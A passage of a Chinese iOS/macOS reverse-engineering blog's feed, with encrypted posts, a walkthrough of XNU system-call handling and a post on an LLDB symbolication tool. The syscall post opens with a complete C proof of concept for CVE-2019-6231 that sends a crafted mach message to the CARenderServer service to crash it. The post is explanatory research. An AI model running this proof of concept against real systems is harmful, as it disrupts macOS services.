YaE4HIPRErjZYXLwoT6jc6/9T3NfKmx4BamIw9eSTr5n4FvzqQJrUHHkiUF5soMPQR3jRrv1vu9ucTw4SZ6DQuLlMqb4RhssX5i+8a52ih1tddWhX3AFsfQO66xcBVMkxO9oTmgwvbWp5Jux9coFz1EvVmhQ2ARNU8d79aBesx9MgSWsDn8UY+LqZ2sES2KL1jxSzf8w987otWjTgpB9o7pb5E168GO5DL+0x2/</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+tun8cPTAJu4t/CDyD+PlyKyOYLgTyQk+Ih6lqO1ig0XcdsooOEY9tZLZSQID4J8Pl4aflQ4HzCsgbW6S3qvDa8yzHI45rrILJyGxgd9ax4rI2ygsFIF++H0SCzgaUXi5dy9MJ9Q7Rjbn6GWF8iZ87Xzz68qOsJmY3MUD+BGlvOHrm+8sigy6A+Oceo0oxCKhsa/amWvHjmEq08NrE90lzVLp9SE35g/UjSryqu2rxjqaCNGqIqZgvUXi9FGWE9/7crwIA2Lr7LpSWmXDcr2KMIJlX2fMRORZUp3hGpkJsSuf5KgTMk1anmuPA9rITXfUn+H5qFJZlt9iL3qFIDozywAhCV5UZfwdq8eP1UxAuKUpF4e6SwZ+sP6DqPfdhWnud+Xcs+W3w303+lVXiFsu8sjoKwUJEju4VzhqEK9P/RFuDTXQCcI5Vmotqba/X1I/K++mrWSW+aBNRVfjh7wm+V4UWYA2L00iWkR5LejsC1R71rlw1DkeEcQm1eC1U8gUcdxLShy7164cjgSQuyQdKVomZBm++LgY6Nt1Syxegi8GEfM52INw4Jvs/F3Xol6/t5PLvTEcecCah8KBOqLbvshQkHoOdDLRCPUa1IvoElhqu0XC8jdKnImnjas38JCoEWCEUjrPc17ZbBS8GgfBizitAEyhwneawS63RT7uzgMJ11cvuLFTdj8ugpzDkbpD6H2nomLbhkuPyIbGwYpJUumhfgVKaQSkNuLCboP3J086bykDE69J/0s/80A5e6U9/di2mIPSGCQzu0hybPd/+xYF0tMjQZ2ySVD8z0/vnbbLonc3cjJVzOREwuDHYNtzsUNHVCZp/O7gTdg/x+2kCQWevFu8oFDq8ZPm3zK9nlOyQOeh/LplyTcdLgMwXxuQpNt1qX6vKFLubwhqMncIGEH1BeK7pEiKLt84dKsTI/6H2opeLp/G1L6Cd+/Y3UAvUgYcGUke/ztzbRHCkULV/qZHfUzLzPSRr6z0HCEW/gMz1jvprGLeNPY8XJF4t4JG7Madi2kKLc3J+lPpd2UaBOHNyODcKzeJr4JBdM1TUrYpdhGDPLIMW5RVRo0ey3OA0o8fahq32V+zMmuahKKQPFNyc48ZBbp7ZYeYL9GjOIvMiI467izuEzMcGwOE0tJcsocFeAOQ1fM98/UHtUZOivkG60TSEGYs0BwW0h2oroswcB4mK4i+OVExEZD75/6NPzwPAxyYhHHaWqz7p7yHx6cMCEgqzdglhy5MPS3rmPgPCuXApjgYJp+QuPxWyJuAO10VEmo9lIAeQSlvB7yk05ucCQEcJO222pH3nrPQwHzpKj88vH3zIT+SAuDF63n6ulGIUGn17hXQC9dNo86+eivdLBXtQi3NLgBwpCduhZSmL7YL9hmjW2BmXVXBniFn6MIfiWPaWwZV5jhjKA6LUWVl5HeCsMFnSGRzadBWWcGsdVHz6QXPzVXIOOcvFusXO7y/KIcF82EHzVVN1LUnJBgmE2akYQCED58+u+sRGyPzdJ2AwrvXTmXP8gL64Lw/PF5eSWfBNcSnl+jDI1vnLPnQHSl4lybZ7mfEoxerhzvCvXTOWG+dQGNnWKdySYc3UBgiQKbLA98fITCpqbcit8GHGhD9EwMVOYrTOkhmDOK2VzvmzDKzUXRqQpTbvY3svCTrflC46vdG9u1RVyXa2kkL0nw9Nz3LFdsSG5nWQbc3MsEcq0c9a37Y4ux6JrCbHIsn/kY93/ijhczjykGj84F7N/6Pjrh9U9hU9kT22S/XhwZDWqz7qEmahaJFLPJWItww92DmqqDSR88SZNwCtdlToSLNkMYtqU4f5vSrIdhC6NvFBTvn6ag0B51CeGbDlC8NUabV6/BsL6HCAvFJ9NE09orLsirleOj9wktXzYU02PHtocA2RgihD1nZbr0VWFpxwbLuZhwsuHqHHro18bZhK7OU2l6oUyy5n8cY6HtmY3lEI60jHbgfF0mkmXA6G7iB2KEkt7LnXOiyX4YnslXVsjjOm5HhMc5DHTEvaS7r3JupTnkEVWRCFN5OuSCZoavDmEw+gv+3DYQxEBuQiVtSKJGwWEPRZ1YQZ6fN/hwLZxgFQDPmEOUw21rX3JbS6YccsGmKNDYDg3WOCsddWrNUbmpOHA/T4bv4i4dBR6sOdmTOvrngroKMXjPbScfUm3EOai1fauyEHZVM0BD8SK8LFJFnjZoRpwzuS//oNqsm5kuftRT0/vyDMmfNf/WVPcY25rpVSjDut3040RLRFVgt5xCvu4WeuDKKdftG4yATGvLnIDqNlsCtpbu26nVg/qRB2JTFXD2HlZ/N6TLFQJCNl8GdhDjBrjY/sMOb1ey/Uw+WTRpWL6jMdeBTApt2G/uiometxeL/0IpKiEy3yOEIyClNvMmLHMChbFltFuDPwHeEQllqLmj8S6chxbfWm2ClCxA7PcVcmAwf+7cOUr+WPWKGcoD2MEzYw5Ck37tYsS31+dTrKb0XMoYvtCuvQwVQYH4ugCKKLdssygiwfFzD6q0v39rZf1tE2NfIS4caX3xiIOLTMHGSK3K/5S6ykWB94+cgTuw9PMkFaPqoyZXjl6Y2KoQTaMyxz0EmYl2l6OvK0/5H+snynBC1aoZzyR1PZSJ8dOecZ7FADzQoehpIe9uBpgP3Ts+r9JcTLfgGYK9K0DH8AD4q4tQeRJpZ3J4cIOSHW6A==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
